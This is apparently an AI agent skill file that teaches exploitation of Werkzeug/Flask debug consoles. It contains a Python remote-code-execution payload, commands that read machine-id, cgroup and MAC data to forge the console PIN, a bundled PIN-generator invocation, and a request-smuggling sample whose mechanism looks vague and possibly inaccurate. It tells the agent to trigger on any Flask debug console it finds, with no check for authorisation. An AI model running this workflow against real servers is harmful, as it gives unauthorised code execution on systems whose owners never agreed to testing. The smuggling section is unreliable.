---
name: werkzeug-debug-exploit
description: Exploit Werkzeug/Flask debug console vulnerabilities for RCE. Use this skill whenever you encounter a Flask/Werkzeug application with debug mode enabled, need to bypass the console PIN protection, or want to exploit the Unicode request smuggling vulnerability. Trigger this skill for any Flask debug console attacks, PIN generation, or when you see /console endpoints in web pentesting.
---

# Werkzeug Debug Console Exploitation

This skill helps you exploit vulnerabilities in Werkzeug/Flask debug consoles, including RCE via the `/console` endpoint and PIN bypass techniques.

## When to Use This Skill

- You discover a Flask/Werkzeug application with debug mode enabled
- You find a `/console` endpoint that's protected by a PIN
- You have file traversal access and need to extract PIN generation data
- You want to exploit the Unicode request smuggling vulnerability in Werkzeug
- You're doing web pentesting on Python/Flask applications

## Attack Vectors

### 1. Direct Console RCE (No PIN)

If debug is active and the console is unprotected, access `/console` directly:

```python
__import__('os').popen('whoami').read()
```

This gives you immediate remote code execution on the server.

### 2. PIN Protected Console - Bypass via File Traversal

When the console is PIN-protected, you can generate the PIN if you have file traversal access. The PIN is generated from two sets of data:

#### Required Data Collection

**Probably Public Bits:**
- `username`: The user running the Flask app
- `modname`: Usually `flask.app`
- `app.__name__`: Typically `Flask`
- `app.__file__`: Path to the Flask app file (e.g., `/usr/local/lib/python3.5/dist-packages/flask/app.py`)

**Private Bits:**
- `uuid.getnode()`: Server's MAC address as decimal
- `get_machine_id()`: From `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` + cgroup info

#### Data Extraction Commands

```bash
# Get MAC address (convert hex to decimal)
cat /sys/class/net/<interface>/address
# Example: 56:00:02:7a:23:ac → 94558041547692

# Get machine ID
cat /etc/machine-id
cat /proc/sys/kernel/random/boot_id

# Get cgroup info
cat /proc/self/cgroup

# Find network interface
cat /proc/net/arp
```

### 3. Unicode Request Smuggling

Werkzeug has a vulnerability where Unicode characters in headers can cause request smuggling:

```http
GET / HTTP/1.1
Host: target
Connection: keep-alive
X-Test: \u0000

[body becomes next request]
```

## Using the PIN Generator Script

The bundled `generate_werkzeug_pin.py` script calculates the console PIN from extracted data:

```bash
python generate_werkzeug_pin.py \
  --username web3_user \
  --modname flask.app \
  --app-name Flask \
  --app-file /path/to/flask/app.py \
  --mac-address 94558041547692 \
  --machine-id d4e6cb65d59544f3331ea0425dc555a1
```

Or use the interactive mode:
```bash
python generate_werkzeug_pin.py --interactive
```

## Exploitation Workflow

1. **Identify debug mode**: Look for Werkzeug error pages or `/console` endpoint
2. **Test console access**: Try accessing `/console` directly
3. **If PIN protected**:
   - Exploit file traversal to read system files
   - Extract username, MAC address, machine-id, and app file path
   - Run the PIN generator script
   - Use the generated PIN to unlock the console
4. **Execute commands**: Once in console, run arbitrary Python/OS commands

## Version Considerations

- **Werkzeug < 2.0**: Uses MD5 hashing for PIN generation
- **Werkzeug >= 2.0**: Uses SHA1 hashing (default in the script)

If the generated PIN doesn't work, try switching the hash algorithm.

## Automated Tools

- [wconsole_extractor](https://github.com/Ruulian/wconsole_extractor) - Automated PIN extraction
- Metasploit has modules for Werkzeug exploitation

## References

- [Werkzeug Console PIN Exploit Guide](https://www.daehee.com/werkzeug-console-pin-exploit/)
- [Werkzeug Unicode Issue](https://github.com/pallets/werkzeug/issues/2833)
- [Twisty Python Writeup](https://mizu.re/post/twisty-python)
- [Werkzeug Debug Source Code](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py)
